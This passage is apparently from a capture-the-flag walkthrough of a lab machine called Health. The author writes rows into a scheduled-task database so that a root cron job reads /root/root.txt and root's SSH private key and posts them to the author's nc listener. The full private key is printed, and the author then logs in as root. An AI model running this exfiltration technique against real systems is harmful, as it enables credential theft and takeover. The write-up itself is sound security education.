+--------------------------------------+------------------------+-----------+----------------------------+-----------+---------------------+---------------------+
1 row in set (0.00 sec)

```

#### Schedule

The cron runs `php artisan schedule:run`. These [tasks are defined](https://laravel.com/docs/9.x/scheduling) in `app\Console\Kernel.php`. For Health, that looks like:

```

    protected function schedule(Schedule $schedule)
    {

        /* Get all tasks from the database */
        $tasks = Task::all();

        foreach ($tasks as $task) {

            $frequency = $task->frequency;

            $schedule->call(function () use ($task) {
                /*  Run your task here */
                HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
                Log::info($task->id . ' ' . \Carbon\Carbon::now());
            })->cron($frequency);
        }
    }

```

It’s fetching the tasks from the DB, and then calling `HealthChecker::check` on each.

### File Read as root

#### Strategy

Every minute, the root is going to pull all the rows from the `tasks` table and try to `file_get_contents` each. If `onlyError` is set to False, then it will send the contents to the webook in the DB.

If I can write to the DB, I can skip the URL validation, and have root read files and exfil them to me.

#### Flag

I’ll test this by trying to read the flag. I’ll have `nc` listen on 9001. I’ll add a row to the `tasks` table with my host port 9001 as the webhook URL, and `root.txt` as the URL to monitor:

```

mysql> insert into tasks (id, webhookUrl, onlyError, monitoredUrl, frequency) values ('223', 'http://10.10.14.6:9001/exfil', 0, '/root/root.txt', '* * * * *');
Query OK, 1 row affected (0.00 sec)

```

It yells at me if I don’t give it an ID, so I’ll make an arbitrary one.

It looks good:

```

mysql> select * from tasks;                                                                                                                
+-----+------------------------------+-----------+----------------+-----------+------------+------------+
| id  | webhookUrl                   | onlyError | monitoredUrl   | frequency | created_at | updated_at |
+-----+------------------------------+-----------+----------------+-----------+------------+------------+
| 223 | http://10.10.14.6:9001/exfil |         0 | /root/root.txt | * * * * * | NULL       | NULL       |
+-----+------------------------------+-----------+----------------+-----------+------------+------------+
1 row in set (0.00 sec)

```

When the clock reaches the next minute, there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.176 52386
POST /exfil HTTP/1.1
Host: 10.10.14.6:9001
Accept: */*
Content-type: application/json
Content-Length: 140

{"webhookUrl":"http:\/\/10.10.14.6:9001\/exfil","monitoredUrl":"\/root\/root.txt","health":"up","body":"1f58dc17************************\n"}

```

That’s the root flag.

#### Shell

To go for a shell, I’ll start by trying to read `/root/.ssh/id_rsa`:

```

mysql> insert into tasks (id, webhookUrl, onlyError, monitoredUrl, frequency) values ('223', 'http://10.10.14.6:9001/exfil', 0, '/root/.ssh/id_rsa', '* * * * *');
Query OK, 1 row affected (0.00 sec)

mysql> select * from tasks;                                                                                                                
+-----+------------------------------+-----------+-------------------+-----------+------------+------------+
| id  | webhookUrl                   | onlyError | monitoredUrl      | frequency | created_at | updated_at |
+-----+------------------------------+-----------+-------------------+-----------+------------+------------+
| 223 | http://10.10.14.6:9001/exfil |         0 | /root/.ssh/id_rsa | * * * * * | NULL       | NULL       |
+-----+------------------------------+-----------+-------------------+-----------+------------+------------+
1 row in set (0.00 sec)

```

When the minute turns, I get the key:

```

oxdf@hacky$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.176 42814
POST /exfil HTTP/1.1
Host: 10.10.14.6:9001
Accept: */*
Content-type: application/json
Content-Length: 1829
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.6:9001\/exfil","monitoredUrl":"\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}

```

### SSH

I’ll need to clean up the key. I can do it in `vim` with substitutions:
- `:%s/\\n/^M/g` will replace the `\n` with newlines (where `^M` is made by hitting Ctrl-v and then Enter)
- `:%s!\\\/!/!g` will replace the escaped `/` without the escapes.

With the key, I can SSH as root:

```

oxdf@hacky$ vim ~/keys/health-root
oxdf@hacky$ chmod 600 ~/keys/health-root
oxdf@hacky$ ssh -i ~/keys/health-root root@health.htb
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)
...[snip]...
root@health:~# 

```

And read the flag:

```

root@health:~# cat root.txt
1f58dc17************************

```